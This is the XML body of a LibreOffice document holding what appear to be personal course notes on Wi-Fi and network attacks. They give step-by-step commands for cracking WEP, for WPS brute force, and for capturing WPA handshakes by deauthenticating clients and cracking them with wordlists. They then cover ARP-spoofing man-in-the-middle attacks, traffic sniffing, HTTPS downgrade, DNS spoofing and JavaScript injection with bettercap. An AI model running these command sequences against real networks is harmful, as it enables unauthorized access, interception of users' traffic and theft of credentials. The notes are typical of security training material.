      <text:p text:style-name="P14"><text:span text:style-name="T20">WEP use RC4 algorithm. If client wants to send data to router. Encrypt using a key. </text:span><text:span text:style-name="T33">Access point get the packet and decrypt. </text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T33">1. </text:span><text:span text:style-name="T20">Client trying to send data to router.</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T20">2.WEP Generate unique key for each packet. Use 24 bit </text:span><text:span text:style-name="T34">random </text:span><text:span text:style-name="T20">initialize vector. </text:span><text:span text:style-name="T71">KEY STREAM= IV + KEY(Password). <text:s/></text:span><text:span text:style-name="T72">IV will be in plain text and it is 24 bit. </text:span><text:span text:style-name="T35">It is very small. IV sent plain text.</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T35">I</text:span><text:span text:style-name="T20">V’s will repeat on busy network. Wep vulnerabale to statistical attack. </text:span></text:p>
      <text:p text:style-name="P3"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P18">WEP Cracking Basics:<text:span text:style-name="T20"> 1. Capture large number of packets/IVs </text:span><text:span text:style-name="T19">→ </text:span><text:span text:style-name="T73">airodump-ng --</text:span><text:span text:style-name="T74">bssid <text:s/>--channel –write file name <text:s text:c="2"/>Interface name </text:span><text:span text:style-name="T20">2. Analyse the cpatured IVs and crack the key → </text:span><text:span text:style-name="T73">aircrack-ng <text:s/>“.</text:span><text:span text:style-name="T75">Cap file name”</text:span></text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P19"><text:span text:style-name="T96">F</text:span>ake Authentication Attack: <text:span text:style-name="T20"><text:s text:c="2"/></text:span><text:span text:style-name="T36">If network is not busy. It would take some time to capture the IV’s . Solution to this we </text:span><text:span text:style-name="T76">Force the AP ti generate new IVs. <text:s/></text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T76">U</text:span><text:span text:style-name="T19">se <text:s/>airodump-ng to get the data.</text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T37">Then use</text:span><text:span text:style-name="T77"> aireplay-ng –f</text:span><text:span text:style-name="T80">a</text:span><text:span text:style-name="T77">ke</text:span><text:span text:style-name="T80">a</text:span><text:span text:style-name="T77">uth 0 -a ‘</text:span><text:span text:style-name="T78">mac </text:span><text:span text:style-name="T77">address of target network’ -h <text:s/>‘mac adress of wireless adapter’ <text:s/>interface <text:s/>name</text:span><text:span text:style-name="T19"> </text:span></text:p>
      <text:p text:style-name="P51"/>
      <text:p text:style-name="P32"><text:span text:style-name="T76">N</text:span><text:span text:style-name="T19">ow we have t</text:span><text:span text:style-name="T79">o</text:span><text:span text:style-name="T19"> communicate with the network → </text:span><text:span text:style-name="T79">When the network is not busy it will be very less trafficing that means very less packets. So we will inject packets. <text:s text:c="2"/></text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T38">S</text:span><text:span text:style-name="T20">o wait for an ARP packet. Capture it and reply, This causes the AP to produce another new packet. </text:span><text:span text:style-name="T39">Now use following code </text:span><text:span text:style-name="T80">--&gt; <text:s/></text:span><text:span text:style-name="T77">aireplay-ng –</text:span><text:span text:style-name="T80">arpreply</text:span><text:span text:style-name="T77"> -</text:span><text:span text:style-name="T80">b</text:span><text:span text:style-name="T77"> ‘</text:span><text:span text:style-name="T78">mac </text:span><text:span text:style-name="T77">address of target network’ - interface <text:s/>name</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P33"><text:span text:style-name="T77">N</text:span><text:span text:style-name="T19">ow use the command: </text:span><text:span text:style-name="T59">aircrack-ng <text:s/>“.</text:span><text:span text:style-name="T60">Cap file name” </text:span></text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P50"/>
      <text:list xml:id="list170334660491527" text:continue-numbering="true" text:style-name="List_20_1">
        <text:list-item>
          <text:p text:style-name="P102"><text:span text:style-name="T97">W</text:span>PA and WPA<text:span text:style-name="T100">2</text:span> Cracking</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P34"><text:span text:style-name="T81">M</text:span><text:span text:style-name="T19">uch more secure. Each packet is encrypted using a unique key. WPS is a feature that can be used with WPA&amp;WPA2. Allow client to connect without password. </text:span><text:span text:style-name="T82">Authentication is done using an 8 digit pin. </text:span><text:span text:style-name="T83">WPS can be used to compute the actual password. </text:span><text:span text:style-name="T84">This works only if push button Authentication (PBC)</text:span></text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P2"><text:span text:style-name="T101">-</text:span><text:span text:style-name="T102">Hacking with</text:span><text:span text:style-name="T103">out</text:span><text:span text:style-name="T102"> a wordlist</text:span><text:span text:style-name="T104">: </text:span><text:span text:style-name="T40">Use </text:span><text:span text:style-name="T61">wash --interface wlan0 </text:span><text:span text:style-name="T40"><text:s/>to see all the networks which use WPS. <text:s/></text:span><text:span text:style-name="T41">Then make a fake authentication with the command </text:span><text:span text:style-name="T62">aireplay-ng --fakeauth 30 <text:s/>-</text:span><text:span text:style-name="T66">a </text:span><text:span text:style-name="T62">AC:84:C6:27:81:B4 -h 00:C0:CA:A4:72:03 wlan0 </text:span><text:span text:style-name="T41"><text:s/>before running go to another terminal and type the command for broot forcing. </text:span><text:span text:style-name="T62"><text:s/>Reaver –bssid AC:84:C6:27:81:B4 –channel <text:s/>4 <text:s/>--interface wlan0 -vvv --no-associate</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:soft-page-break/></text:p>
      <text:p text:style-name="P22"><text:span text:style-name="T101">Using handshake packets: </text:span><text:span text:style-name="T20"><text:s/></text:span><text:span text:style-name="T42">There are 4 packets sent when a client connect to the network. </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">Use the comman <text:s/><text:span text:style-name="T56">airodump-ng --bssid <text:s/>AC:84:C6:27:81:B4 --channel 4 --write wpa_handshake <text:s/>wlan0 </text:span><text:span text:style-name="T63">after this use the following command <text:s/></text:span></text:p>
      <text:p text:style-name="P53">aireplay-ng --deauth 4 -a AC:84:C6:27:81:B4 -c 32:99:E3:AC:E4:53 wlan0 </text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P35"><text:span text:style-name="T85">F</text:span><text:span text:style-name="T19">rom the above two steps we will get the handshake packets. Now we will use this packet to find the password. </text:span><text:span text:style-name="T86">Handshake doesn’t contain data the helps recover the key. </text:span><text:span text:style-name="T87">It contains data that can be used to check if a key is valid or not.</text:span></text:p>
      <text:p text:style-name="P68"><text:s/></text:p>
      <text:p text:style-name="P76"><text:span text:style-name="T87">-</text:span><text:span text:style-name="T11">Hacking with a wordlist</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T87">N</text:span><text:span text:style-name="T19">ow we have to create a wordlist using the tool called crunch:</text:span></text:p>
      <text:p text:style-name="P54">crunch [min. no. of character of passwords] [max no. of. Chars of passwords][characters]-t[pattern]-o[Filename]</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T19">Example: </text:span><text:span text:style-name="T88">aircrack-ng</text:span></text:p>
      <text:p text:style-name="P55"/>
      <text:p text:style-name="P55">crunch 6 8 abc12 -o test.txt Page</text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T19">cat test.txt </text:span><text:span text:style-name="T20"><text:s/>to open the passwords</text:span></text:p>
      <text:p text:style-name="P69"/>
      <text:p text:style-name="P6"><text:span text:style-name="T20">WE need two things for cracking <text:s/>WPA/WPA2 → </text:span><text:span text:style-name="T56">4-Way handshake and Wordlist </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T56">MIC is used by access point to check that the password </text:span><text:span text:style-name="T64">is</text:span><text:span text:style-name="T56"> correct or not. </text:span><text:span text:style-name="T65">So comparing MIC password with wordlist will help us to find the password.</text:span></text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P7"><text:span text:style-name="T65">aircrack-ng handshake-03.cap -w test.txt --→ </text:span><text:span text:style-name="T43">This command compare the worldlist we created with the handshake data packet.</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list170335637010431" text:continue-list="list170335436569637" text:style-name="Numbering_20_123">
        <text:list-header>
          <text:p text:style-name="P101"/>
        </text:list-header>
        <text:list-item>
          <text:p text:style-name="P101">Post-Connection Attacks</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P70">Attacks after gaining access. Can gather more data. Intercept data. Can modify data on the fly. </text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P26">Information Gathering: <text:span text:style-name="T20"><text:s/></text:span><text:span text:style-name="T44">Shows all the devices connected to the network. <text:s/></text:span><text:span text:style-name="T45">Information gathering provide </text:span><text:span text:style-name="T89">Ip address, Mac address, Operating system, open ports, running services.</text:span></text:p>
      <text:p text:style-name="P89"/>
      <text:p text:style-name="P27"><text:span text:style-name="T89">N</text:span><text:span text:style-name="T19">et discover and Nmap </text:span><text:span text:style-name="T20">will do the above job for us.</text:span></text:p>
      <text:p text:style-name="P92"/>
      <text:p text:style-name="P28"><text:span text:style-name="T19">Netdiscover -r 192.168.0.0/24 → </text:span><text:span text:style-name="T20">Will give all the devices connected to the network</text:span></text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P31">Nmap/Zmap : <text:span text:style-name="T20"><text:s/></text:span><text:span text:style-name="T46">Used for network mapping. </text:span><text:span text:style-name="T47">From an <text:s/>ip/ip range it can discover </text:span><text:span text:style-name="T90">1. open ports 2. Rubbing services 3.Operating system <text:s/>4. connected clients <text:s/></text:span></text:p>
      <text:p text:style-name="P36"><text:span text:style-name="T90">T</text:span><text:span text:style-name="T19">o use this : </text:span><text:span text:style-name="T56">Type zenmap in terminal → </text:span><text:span text:style-name="T91">Give target ip / target ip range and try ping and quick scan for getting basic data.</text:span></text:p>
      <text:p text:style-name="P97"/>
      <text:p text:style-name="P37"><text:span text:style-name="T67">C</text:span><text:span text:style-name="T56">onnect to phone: ssh </text:span><text:a xlink:type="simple" xlink:href="mailto:root@ipadressofphone" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">root@ipadressofphone</text:a><text:span text:style-name="T56"> </text:span><text:span text:style-name="T92">then enter the password (Jailbrokenpassword)</text:span></text:p>
      <text:p text:style-name="P98"/>
      <text:p text:style-name="P73">ARP Poisoning:</text:p>
      <text:p text:style-name="P99"/>
      <text:p text:style-name="P98"/>
      <text:p text:style-name="P57">M <text:span text:style-name="T105">an in the middle attack: </text:span><text:span text:style-name="T106">Attack will btw the communication</text:span></text:p>
      <text:p text:style-name="P57"/>
      <text:p text:style-name="P29">1. ARP Spoofing: <text:span text:style-name="T20"><text:s/></text:span><text:span text:style-name="T48">Request and response. <text:s/></text:span><text:span text:style-name="T49">Adress Resolution Protocol (ARP) <text:s/>will allocate ip address to a MAC address. </text:span><text:span text:style-name="T50">By ARP spoofing we will get the MAC address.</text:span></text:p>
      <text:p text:style-name="P93"/>
      <text:p text:style-name="P93"/>
      <text:p text:style-name="P30"><text:soft-page-break/><text:span text:style-name="T50">W</text:span><text:span text:style-name="T20">e can use </text:span><text:span text:style-name="T19">ARP spoof: </text:span><text:span text:style-name="T93">arpspoof -i [interface] -t [clientIP] <text:s/>[gatewayIP]</text:span></text:p>
      <text:p text:style-name="P90"><text:tab/> <text:s text:c="26"/>arpspoof -i [interface] -t [gatewayIP] [clientIP] </text:p>
      <text:p text:style-name="P90"/>
      <text:p text:style-name="P30"><text:span text:style-name="T93">arpspoof -i wlan0 -t 192.168.0.109 <text:s/>192.168.0.1 → </text:span><text:span text:style-name="T51">Telling the client that I am the router</text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T93">arpspoof -i wlan0 -t 192.168.0.1 192.168.0.109 → </text:span><text:span text:style-name="T51">Telling the router I am the client</text:span></text:p>
      <text:p text:style-name="P78">echo 1 &gt; /proc/sys/net/ipv4/ip_forward → <text:span text:style-name="T6">Forwarding the request to router </text:span><text:span text:style-name="T7">[otherwise client won’t have internet access]</text:span></text:p>
      <text:p text:style-name="P103"/>
      <text:p text:style-name="P79"><text:span text:style-name="T111">W</text:span><text:span text:style-name="T110">e can also use </text:span><text:span text:style-name="T112">Bettercap.</text:span>: <text:s/>bettercap –help</text:p>
      <text:p text:style-name="P80"><text:s text:c="47"/>bettercap <text:s/>-iface wlan0 </text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P80">net.probe on → <text:span text:style-name="T107">Show the Ip of devices connected //Discover connected client</text:span></text:p>
      <text:p text:style-name="P80">net.show <text:s text:c="2"/>→&gt; <text:span text:style-name="T107">Show details of devices connected</text:span></text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P110">net.recon on → //Start network hosts discovery</text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P80">set arp.spoof.fullduplex true <text:s text:c="12"/>//enable spoofing</text:p>
      <text:p text:style-name="P80">set arp.spoof.targets 192.168.0.109 <text:s text:c="2"/>//set target ip </text:p>
      <text:p text:style-name="P80">arp.spoof on <text:s text:c="39"/>// Turn on spoofing</text:p>
      <text:p text:style-name="P80">help</text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P78">net.sniff on → <text:span text:style-name="T108">Sniff <text:s/>all the data <text:s text:c="9"/>// Sniff <text:s/>all the data</text:span></text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P81">Run bettercap using caplet <text:span text:style-name="T1">(it is the text file with all this commands)</text:span></text:p>
      <text:p text:style-name="P104"/>
      <text:p text:style-name="P104"/>
      <text:p text:style-name="P82">Bypassing HTTPS:<text:span text:style-name="T1"> </text:span><text:span text:style-name="T8">To do this downgrade https to http. </text:span><text:span text:style-name="T9">We use sslstrip for this.</text:span></text:p>
      <text:p text:style-name="P105"/>
      <text:p text:style-name="P82"><text:span text:style-name="T9"><text:s text:c="17"/></text:span><text:span text:style-name="T109">bettercap -iface wlan0 -caplet /root/spoof.cap</text:span></text:p>
      <text:p text:style-name="P77"><text:tab/> <text:s text:c="4"/><text:span text:style-name="T10">caplets.show</text:span></text:p>
      <text:p text:style-name="P78"><text:tab/> <text:s text:c="4"/>hstshijack/hstshijack </text:p>
      <text:p text:style-name="P78"/>
      <text:p text:style-name="P84">DNS Spoofing Attack<text:span text:style-name="T19">: </text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T19"><text:s/></text:span><text:span text:style-name="T56">service apache2 start <text:s text:c="11"/>// </text:span><text:span text:style-name="T68">Starting our own server to redirect</text:span></text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T68"><text:s/>bettercap -iface wlan0 -caplet /root/spoof.cap <text:s/>//</text:span><text:span text:style-name="T69">run caplet</text:span></text:p>
      <text:p text:style-name="P107">set dns.spoof.all true</text:p>
      <text:p text:style-name="P107">set dns.spoof.domains danieljoz95.de</text:p>
      <text:p text:style-name="P83"><text:span text:style-name="T69">dns.spoof </text:span><text:span text:style-name="T70">on</text:span></text:p>
      <text:p text:style-name="P108"/>
      <text:p text:style-name="P74"><text:span text:style-name="T12">I</text:span><text:span text:style-name="T10">njecting Javascript</text:span></text:p>
      <text:p text:style-name="P71">MAKE JAVASCRIPT FILE → Add to the <text:s/><text:span text:style-name="T10">hstshijack file. <text:s text:c="2"/>*:/directory/.javascriptfile</text:span></text:p>
      <text:p text:style-name="P91"/>
      <text:p text:style-name="P94"><text:span text:style-name="T10">There is GUI for bettercap. </text:span><text:span text:style-name="T13">It is called webinterface --→ </text:span><text:span text:style-name="T113">run</text:span><text:span text:style-name="T14"> bettercap -iface wlan0 → </text:span><text:span text:style-name="T113">run</text:span><text:span text:style-name="T14"> http-ui</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P88"><text:span text:style-name="T14">W</text:span><text:span text:style-name="T10">ireshark</text:span></text:p>
      <text:p text:style-name="P95"><text:s/>Network protocol analyzer. <text:span text:style-name="T114">Keet track of what happenning in their network. </text:span><text:span text:style-name="T15">Logs packet that flow through the selected interface.</text:span></text:p>
      <text:p text:style-name="P95"><text:span text:style-name="T15"/></text:p>
      <text:p text:style-name="P95"><text:span text:style-name="T15"/></text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P111"><text:soft-page-break/>Making Fake Access points</text:p>
      <text:p text:style-name="P87"/>
      <text:p text:style-name="P96">Use <text:span text:style-name="T10">WIFIHotspot </text:span>Tool to create fake access point</text:p>
      <text:p text:style-name="P96"/>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13:33:03.929257554</meta:creation-date>
    <dc:date>2021-12-02T17:03:33.981981108</dc:date>
    <meta:editing-duration>PT15H4M23S</meta:editing-duration>
    <meta:editing-cycles>195</meta:editing-cycles>
    <meta:generator>LibreOffice/7.1.7.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="105" meta:word-count="1465" meta:character-count="9264" meta:non-whitespace-character-count="7631"/>
  </office:meta>
</office:document-meta>
</file>